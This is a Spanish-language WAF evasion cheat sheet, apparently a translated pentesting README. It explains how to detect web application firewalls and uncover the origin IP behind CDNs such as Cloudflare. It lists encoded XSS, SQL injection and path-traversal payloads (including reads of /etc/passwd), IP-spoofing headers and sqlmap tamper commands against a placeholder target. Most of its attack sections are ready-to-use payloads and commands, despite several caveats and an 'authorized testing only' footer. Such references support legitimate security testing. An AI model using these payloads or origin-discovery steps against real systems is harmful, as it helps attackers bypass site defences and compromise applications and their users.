# 🛡️ Guía de referencia de evasión de WAF

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗ █████╗ ███████╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██║    ██║██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║ █╗ ██║███████║█████╗      ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██║███╗██║██╔══██║██╔══╝      ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚███╔███╔╝██║  ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
   Evasión de cortafuegos de aplicaciones web
```

---

## 🎯 Qué es la evasión de WAF

Las técnicas de **evasión de WAF** permiten a los pentesters eludir cortafuegos de aplicaciones web y acceder al servidor de origen o enviar payloads.

### WAF habituales
- Cloudflare
- AWS WAF
- Akamai
- Imperva/Incapsula
- ModSecurity
- F5 BIG-IP
- Fortinet FortiWeb
- Sucuri

---

## 🔍 Detección de WAF

### wafw00f
```bash
# Detectar el WAF
wafw00f https://target.com

# Salida detallada
wafw00f https://target.com -v

# Probar todos los WAF
wafw00f https://target.com -a
```

### Detección manual
```bash
# Comprobar las cabeceras de respuesta
curl -I https://target.com

# Buscar:
# - Server: cloudflare
# - X-Sucuri-ID
# - X-CDN: Incapsula
# - cf-ray (Cloudflare)
```

---

## 🌐 Descubrimiento de la IP de origen

> **Interpretación:** DNS históricos, certificados, correos y favicons generan candidatos; no confirman por sí solos que una IP sea el origen actual. `httpx -ip` muestra direcciones resueltas, no prueba la ausencia de CDN. Quedar fuera de los rangos de un proveedor tampoco demuestra un origen expuesto.

### Historial DNS
```bash
# Servicios que consultar:
# - SecurityTrails.com
# - ViewDNS.info/iphistory
# - DNSHistory.org
# - CompleteDNS.com

# API de SecurityTrails
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: YOUR_KEY"
```

### Búsqueda de certificados SSL
```bash
# Buscar certificados en Censys.io
# Buscar target.com en el certificado

# crt.sh - Transparencia de certificados
curl "https://crt.sh/?q=target.com&output=json" | jq

# CLI de Censys
censys search "parsed.names: target.com"
```

### Shodan/Censys
```bash
# Shodan
shodan search "ssl:target.com"
shodan search "hostname:target.com"

# Shodan - Buscar por hash del certificado SSL
shodan search "ssl.cert.fingerprint:XXXX"

# Censys
# Buscar: services.tls.certificates.leaf_data.subject.common_name: target.com
```

### Cabeceras de correo
```bash
# Suscribirse al boletín o a las notificaciones
# Buscar la IP de origen en las cabeceras del correo

# Buscar:
# Received: from [ORIGIN_IP]
# X-Originating-IP: [ORIGIN_IP]
```

### Subdominios sin CDN
```bash
# Encontrar subdominios
subfinder -d target.com -o subs.txt

# Comprobar cuáles están detrás de una CDN
cat subs.txt | httpx -ip

# Buscar:
# - mail.target.com
# - ftp.target.com
# - dev.target.com
# - staging.target.com
# - api-internal.target.com
# - vpn.target.com
```

### Hash del favicon

> **Hashes distintos:** el primer comando calcula MD5; el fragmento Python calcula MurmurHash3 de una representación Base64. No son valores intercambiables para la búsqueda `http.favicon.hash`.
```bash
# Obtener el hash del favicon
curl -s https://target.com/favicon.ico | md5sum

# Buscar en Shodan por hash del favicon
python3 -c "import mmh3,requests,codecs; print(mmh3.hash(codecs.encode(requests.get('https://target.com/favicon.ico').content,'base64')))"

# Búsqueda en Shodan
shodan search "http.favicon.hash:HASH_VALUE"
```

### Evasión mediante IPv6
```bash
# El WAF podría no cubrir IPv6
dig AAAA target.com
curl -g "http://[IPv6_ADDRESS]/" -H "Host: target.com"
```

### Rangos de la nube
```bash
# Descargar rangos de IP de la nube
# AWS: https://ip-ranges.amazonaws.com/ip-ranges.json
# Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519
# GCP: https://www.gstatic.com/ipranges/cloud.json

# Si la IP objetivo no está en los rangos de la nube, podría ser el origen
```

---

## 🔓 Evasión mediante codificación de payloads

### Codificación URL
```
# Codificación simple
<script> → %3Cscript%3E

# Codificación doble
<script> → %253Cscript%253E

# Combinación de codificaciones
<script> → %3Cscr%69pt%3E
```

### Codificación Unicode

> **Compatibilidad:** las secuencias `%C0%BC` y `%C0%BE` del original son codificaciones UTF-8 excesivamente largas, no UTF-8 válido según [RFC 3629](https://www.rfc-editor.org/rfc/rfc3629.html). Solo podrían depender de un tratamiento defectuoso o histórico.
```
# UTF-8
<script> → %C0%BC%73%63%72%69%70%74%C0%BE

# Secuencias de escape Unicode
<script> → \u003cscript\u003e

# Entidades HTML
<script> → &#60;script&#62;
<script> → &#x3c;script&#x3e;
```

### Manipulación de mayúsculas y minúsculas
```
<script> → <ScRiPt>
<script> → <SCRIPT>
SELECT → SeLeCt
UNION → UnIoN
```

### Bytes nulos
```
# Inyección de bytes nulos
<scri%00pt>
<script%00>alert(1)</script>
SEL%00ECT
```

### Comentarios

> **Sintaxis:** dividir una palabra clave con comentarios no garantiza una consulta válida. Los comentarios ejecutables de MySQL y su condición de versión son específicos de ese gestor; véase el [manual de comentarios de MySQL](https://dev.mysql.com/doc/refman/8.0/en/comments.html).
```sql
# Comentarios SQL
SEL/**/ECT
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT

# Comentarios en línea
SELECT/*comment*/FROM
1'/**/OR/**/1=1--
```

### Alternativas a los espacios en blanco
```sql
# Tabulación, salto de línea y retorno de carro
SELECT%09FROM
SELECT%0AFROM
SELECT%0DFROM

# Signo más
UNION+SELECT
1'+OR+1=1--
```

---

## 🔥 Evasiones específicas de WAF

> **Alcance:** estos ejemplos no identifican versiones de WAF concretas ni garantizan evasión. El resultado depende de las reglas, la normalización, el contexto y el comportamiento de la aplicación. Algunas formas HTML y SQL son históricas o esquemáticas.

### Evasión mediante XSS
```html
# Versión estándar bloqueada
<script>alert(1)</script>

# Variantes de evasión
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

# Sin paréntesis
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>

# Sin alert
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
```

### Evasión mediante SQLi
```sql
# Evasión mediante UNION
UNION SELECT → UNION ALL SELECT
UNION SELECT → /*!50000UNION*/ SELECT
UNION SELECT → %55nion %53elect
UNION SELECT → uNioN sEleCt

# Evasión mediante comentarios
-- → #
-- → --+
-- → --%00
-- → /**/

# Evasión mediante operadores lógicos
OR 1=1 → OR 2=2
OR 1=1 → OR 'a'='a'
OR 1=1 → || 1=1
AND 1=1 → && 1=1

# Comentarios específicos de versión (MySQL)
/*!50000SELECT*/ → Se ejecuta solo si MySQL >= 5.0
```

### Evasión mediante recorrido de directorios
```
../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252F..%252Fetc/passwd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

---

## 🛠️ Técnicas HTTP

### Contaminación de parámetros HTTP
```http
# Parámetros duplicados
?id=1&id=2
?id=1&ID=2

# Inyección de arrays
?id[]=1&id[]=2
?id=1&id=2&id=3
```

### Manipulación del método HTTP
```bash
# Cambiar el método
curl -X POST → curl -X PUT
curl -X GET → curl -X TRACE

# Cabeceras para sobrescribir el método
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
```

### Manipulación de cabeceras

> **Límite:** cambiar una cabecera de IP reenviada no cambia la IP de origen de la conexión; solo influye si algún componente confía indebidamente en ella. La codificación chunked, por sí sola, tampoco demuestra una evasión o una desincronización HTTP.
```http
# Cabeceras de suplantación de IP
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Confusión de Content-Type
Content-Type: application/json
Content-Type: text/plain
Content-Type: application/xml
```

### Codificación por bloques (chunked)
```http
Transfer-Encoding: chunked

4
test
0
```

---

## 🛠️ Herramientas

| Herramienta | Finalidad |
|------|---------|
| **wafw00f** | Detección de WAF |
| **CloudFlair** | Localización del servidor de origen de Cloudflare |
| **Bypass-Firewalls-by-DNS-History** | Búsqueda en el historial DNS |
| **WhatWaf** | Detección y evasión de WAF |
| **sqlmap --tamper** | Scripts de evasión SQLi |

### Scripts tamper de sqlmap
```bash
# Usar scripts tamper
sqlmap -u "http://target.com/id=1" --tamper=space2comment
sqlmap -u "http://target.com/id=1" --tamper=randomcase
sqlmap -u "http://target.com/id=1" --tamper=between

# Varios scripts tamper
sqlmap -u "http://target.com/id=1" --tamper=space2comment,randomcase
```

---

## 📊 Referencia rápida

| Técnica | Caso de uso |
|-----------|----------|
| Historial DNS | Encontrar la IP de origen |
| Búsqueda SSL | Búsqueda de certificados en Censys/Shodan |
| Enumeración de subdominios | Encontrar subdominios sin CDN |
| Codificación | Eludir filtros |
| Variaciones de mayúsculas y minúsculas | Eludir reglas sencillas |
| Comentarios | Fragmentar palabras clave |

---

## 📚 Recursos

- [PayloadsAllTheThings WAF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [HackTricks WAF](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass)
- [Evasión de WAF de OWASP](https://owasp.org/www-community/attacks/Bypass_Web_Application_Firewall)

---

<p align="center">
  <b>🛡️ ¡Explora la evasión de WAF!</b><br>
  <i>¡Solo para pruebas autorizadas!</i>
</p>
